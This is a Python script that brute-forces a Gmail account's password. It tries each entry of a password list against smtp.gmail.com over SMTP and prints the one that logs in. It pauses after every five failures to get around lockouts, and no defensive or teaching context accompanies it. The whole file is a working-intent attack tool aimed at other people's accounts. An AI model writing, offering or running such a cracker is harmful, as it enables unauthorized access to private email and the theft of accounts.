import smtplib
import argparse
import time

parser = argparse.ArgumentParser()

parser.add_argument("account", help = "account to crack")
parser.add_argument("passlst", help = "password list")

args = parser.parse_args()

def smtp_startment():
    server = smtplib.SMTP("smtp.gmail.com", "587")
    server.ehlo() #optional
    server.starttls()

    password_cracker(args.account, args.passlst, server)
    

def password_cracker(account, passlst, server):
    txt = open(passlst, "r")
    txtContent = txt.readlines()
    txt.close()

    count = 0
    found = False
    for l in txtContent:
        try:
            server.login(account, l)
            found = True

        except(smtplib.SMTPAuthenticationError, smtplib.SMTPServerDisconnected):
            count += 1
            if count == 5:
                count = 0
                waiting = 60
                print ("waiting " + str(waiting)+ " seconds...\n")
                time.sleep(waiting)

    
        if found:
            print ("password found: " + l)
            break

        else:
            print(l)

smtp_startment()
